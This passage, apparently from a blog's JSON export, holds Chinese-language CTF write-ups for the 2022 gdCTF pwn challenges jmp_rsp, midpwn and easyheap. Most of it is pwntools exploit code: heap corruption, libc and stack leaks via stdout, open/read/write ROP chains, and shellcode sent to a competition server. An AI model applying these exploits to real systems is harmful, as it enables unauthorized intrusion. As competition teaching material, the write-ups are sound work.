<span class=\"comment\"># 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">11</span>,<span class=\"string\">&#x27;a&#x27;</span> *<span class=\"number\">0x28</span>+<span class=\"string\">&#x27;\\xc1&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">12</span>)</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 17</span></span><br><span class=\"line\">delete(<span class=\"number\">17</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x31</span>)+p64(environ-<span class=\"number\">0x10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add2(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>) <span class=\"comment\"># 17</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">17</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">16</span>)</span><br><span class=\"line\">stack_base = u64(io.recv(<span class=\"number\">8</span>)) <span class=\"comment\"># - 0x1f438 </span></span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_base:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_base))</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000023b72</span> + libc_base</span><br><span class=\"line\">pop_rsi = libc_base + <span class=\"number\">0x000000000002604f</span></span><br><span class=\"line\">pop_rdx_rcx_rbx = libc_base + <span class=\"number\">0x00000000001025ad</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func</span>(<span class=\"params\">a, b, c, d</span>):</span><br><span class=\"line\">    pp = p64(pop_rdi) + p64(a)</span><br><span class=\"line\">    pp += p64(pop_rsi) + p64(b)</span><br><span class=\"line\">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pp</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">flag_path = <span class=\"string\">&#x27;/home/pwn/flag\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag_path_addr = stack_base + <span class=\"number\">0x150</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 18</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 19</span></span><br><span class=\"line\">delete(<span class=\"number\">19</span>)</span><br><span class=\"line\">delete(<span class=\"number\">18</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x31</span>)+p64(flag_path_addr))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add2(<span class=\"number\">0x28</span>, flag_path) <span class=\"comment\"># 18</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>) <span class=\"comment\"># 19</span></span><br><span class=\"line\">delete(<span class=\"number\">19</span>)</span><br><span class=\"line\">delete(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add_ret =  stack_base - stack_offset</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">12</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0xc1</span>) + p64(add_ret))</span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = func(<span class=\"number\">0x23330000</span>, <span class=\"number\">0x1000</span>, <span class=\"number\">7</span>, <span class=\"number\">34</span>) + p64(libc.sym[<span class=\"string\">&#x27;mmap&#x27;</span>])</span><br><span class=\"line\">p += func(<span class=\"number\">0</span>, <span class=\"number\">0x23330000</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0</span>) + p64(libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]) </span><br><span class=\"line\">p += p64(<span class=\"number\">0x23330000</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;len:&#x27;</span> + <span class=\"built_in\">hex</span>(<span class=\"built_in\">len</span>(p)))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, p)</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> sc == <span class=\"string\">&#x27;&#x27;</span>:</span><br><span class=\"line\">    sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">    sc += asm(shellcraft.read(<span class=\"number\">6</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">    sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">io.send(sc)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive() </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"easyheap\"><a href=\"#easyheap\" class=\"headerlink\" title=\"easyheap\"></a>easyheap</h1><h2 id=\"题目-2\"><a href=\"#题目-2\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip</a></p>\n<h2 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>主要漏洞在，v3局部变量可能未初始化，可以提前布置栈帧，达到任意位置写入堆地址</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220524094853062.png\" alt=\"image-20220524094853062\"></p>\n<p>以及还有一个backdoor函数，可以堆上任意写8字节（虽然只有一次，但利用上边的漏洞可以无限次）</p>\n<p>利用house of orange，修改_IO_2_stdout_，泄露libc_base，再次利用泄露environ地址，栈地址，heap基址</p>\n<p>之后利用修改tcachebin上的fd指针，参考midpwn的解法，修改add函数的返回地址，写入orw ROP，获得flag</p>\n<h2 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&quot;amd64&quot;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>:process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./easyheap&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    pp = <span class=\"string\">&#x27;1\\x00&#x27;</span></span><br><span class=\"line\">    pp += <span class=\"string\">&#x27;\\x00&#x27;</span> * (<span class=\"number\">12</span> - <span class=\"built_in\">len</span>(pp))</span><br><span class=\"line\">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, pp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add3</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    pp = <span class=\"string\">&#x27;1\\x00&#x27;</span></span><br><span class=\"line\">    pp += <span class=\"string\">&#x27;\\x00&#x27;</span> * (<span class=\"number\">12</span> - <span class=\"built_in\">len</span>(pp))</span><br><span class=\"line\">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, pp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Idx?\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit2</span>(<span class=\"params\">idx, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Idx?&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete\\n&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?\\n&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Offset?\\n&#x27;</span>, <span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:\\n&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor2</span>(<span class=\"params\">size, offset, cont</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;4.delete&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size?&#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Offset?&#x27;</span>, <span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Context:&#x27;</span>, cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    fake_size = <span class=\"number\">0x061</span> + <span class=\"number\">0x1000</span>*<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># add(,&#x27;aaaaa&#x27;)</span></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, <span class=\"number\">0x6b8</span>, p64(fake_size))</span><br><span class=\"line\">    add(<span class=\"number\">0x2000</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add2(<span class=\"number\">0x10</span>, -<span class=\"number\">10</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, -<span class=\"number\">3080</span>, <span class=\"string\">&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># backdoor(0x18, -32, &#x27;\\xb0&#x27;)</span></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, -<span class=\"number\">3616</span>+<span class=\"number\">6</span>, p32(<span class=\"number\">0x7</span>))</span><br><span class=\"line\">    stdout_in = <span class=\"number\">0x16a0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    backdoor(<span class=\"number\">0x18</span>, <span class=\"number\">800</span>, <span class=\"string\">&#x27;\\xa0\\x16&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># add2(0x18, 0, &#x27;aa&#x27;)</span></span><br><span class=\"line\">    flag = <span class=\"number\">0xfbad1800</span></span><br><span class=\"line\">    <span class=\"comment\"># add2(0x18, )</span></span><br><span class=\"line\">    add2(<span class=\"number\">0x48</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;aa&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        add2(<span class=\"number\">0x48</span>, <span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + <span class=\"string\">&#x27;\\x08&#x27;</span>)</span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">8</span>,timeout=<span class=\"number\">0.2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1.add&#x27;</span> <span class=\"keyword\">in</span> inp:</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> <span class=\"number\">1</span> == <span class=\"number\">2</span></span><br><span class=\"line\">        stdin_addr = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;stdin_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(stdin_addr))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = stdin_addr - <span class=\"number\">0x1ee7f0</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena_96 = <span class=\"number\">0x1ecbe0</span> + libc_base</span><br><span class=\"line\">edit2(<span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(main_arena_96))</span><br><span class=\"line\"></span><br><span class=\"line\">heap_base = u64(io.recv(<span class=\"number\">8</span>)) -<span class=\"number\">0x23010</span>  </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_base:&#x27;</span>+<span class=\"built_in\">hex</span>(heap_base))</span><br><span class=\"line\"></span><br><span class=\"line\">environ = <span class=\"number\">0x228138</span> + libc_base <span class=\"comment\"># 偏移量可能不同</span></span><br><span class=\"line\">edit2(<span class=\"number\">0</span>, p64(flag)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(environ) + p64(environ+<span class=\"number\">0x10</span>) + p64(environ+<span class=\"number\">0x10</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;environ:&#x27;</span>+<span class=\"built_in\">hex</span>(environ))</span><br><span class=\"line\"></span><br><span class=\"line\">stack_environ = u64(io.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_environ:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_environ))</span><br><span class=\"line\"></span><br><span class=\"line\">rax_0 = <span class=\"number\">0x00000000000b1d89</span> + libc_base <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">rax_1 = <span class=\"number\">0x00000000000cfb50</span> + libc_base <span class=\"comment\">#  mov rax, 1 ; ret</span></span><br><span class=\"line\">rax_2 = <span class=\"number\">0x00000000000cfb60</span> + libc_base <span class=\"comment\">#  mov rax, 2 ; ret</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000023b72</span> + libc_base <span class=\"comment\"># pop rdi ; ret</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x000000000002604f</span> + libc_base <span class=\"comment\"># pop rsi ; ret</span></span><br><span class=\"line\">xchg_eax_edi = <span class=\"number\">0x00000000000f1b95</span> + libc_base <span class=\"comment\"># xchg eax, edi ; ret</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x00000630D9</span> + libc_base <span class=\"comment\"># syscall; ret in (funlockfile) </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vuln_stack_tar = stack_environ - <span class=\"number\">0x138</span> + <span class=\"number\">0x20</span></span><br><span class=\"line\">backdoor2(<span class=\"number\">0x18</span>, -<span class=\"number\">512</span>, p64(vuln_stack_tar))</span><br><span class=\"line\"></span><br><span class=\"line\">add3(<span class=\"number\">0xf0</span>-<span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io.sendafter(&#x27;4.delete&#x27;, &#x27;1&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># io.sendlineafter(&#x27;Size?&#x27;, )</span></span><br><span class=\"line\"></span><br><span class=\"line\">rop_tmp = [</span><br><span class=\"line\">    pop_rdi, <span class=\"number\">0xadd</span>,</span><br><span class=\"line\">    pop_rsi, <span class=\"number\">0</span>,</span><br><span class=\"line\">    rax_2, syscall, <span class=\"comment\"># open</span></span><br><span class=\"line\">    xchg_eax_edi, <span class=\"comment\"># eax -&gt; edi fd</span></span><br><span class=\"line\">    pop_rsi, <span class=\"number\">0xadd</span>,</span><br><span class=\"line\">    rax_0, syscall, <span class=\"comment\"># read</span></span><br><span class=\"line\">    pop_rdi, <span class=\"number\">1</span>, </span><br><span class=\"line\">    rax_1, syscall <span class=\"comment\"># write</span></span><br><span class=\"line\">]</span><br><span class=\"line\">rop_tmp[<span class=\"number\">1</span>] = rop_tmp[<span class=\"number\">8</span>] = vuln_stack_tar + <span class=\"built_in\">len</span>(rop_tmp) * <span class=\"number\">8</span></span><br><span class=\"line\">rop_tmp = flat(rop_tmp) + <span class=\"string\">&#x27;./flag\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">add3(<span class=\"number\">0xf0</span>-<span class=\"number\">8</span>, <span class=\"number\">1</span>, rop_tmp)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>赛后的补题，比赛没时间了（菜），本地记得新建.&#x2F;flag文件</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220524095329685.png\" alt=\"image-20220524095329685\"></p>\n","excerpt":"","more":"<h1 id=\"jmp-rsp\"><a href=\"#jmp-rsp\" class=\"headerlink\" title=\"jmp_rsp\"></a>jmp_rsp</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip</a></p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>直接一把梭，写入ROP，在bss上写shellcode即可</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./jmp_rsp&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;47.106.122.102&#x27;</span>, <span class=\"number\">44071</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./jmp_rsp&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.clear(arch=<span class=\"string\">&#x27;x86_64&#x27;</span>)</span><br><span class=\"line\">shell_code = asm(shellcraft.sh())</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400696</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000410173</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000449395</span></span><br><span class=\"line\">vuln_buf = <span class=\"number\">0x00000006B9144</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x88</span> + p64(pop_rdi) + p64(<span class=\"number\">0</span>) + p64(pop_rsi) + p64(vuln_buf) + p64(pop_rdx) + p64(<span class=\"number\">0x50</span>) + p64(elf.sym[<span class=\"string\">&#x27;read&#x27;</span>]) + p64(vuln_buf)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\">time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">io.sendline(shell_code)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"midpwn\"><a href=\"#midpwn\" class=\"headerlink\" title=\"midpwn\"></a>midpwn</h1><h2 id=\"题目-1\"><a href=\"#题目-1\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip</a></p>\n<h2 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>逆向分析发现，开了沙箱，需要利用orw进行文件内容泄露</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220523085903003.png\" alt=\"image-20220523085903003\"></p>\n<p>通过逆向分析发现edit函数存在off by 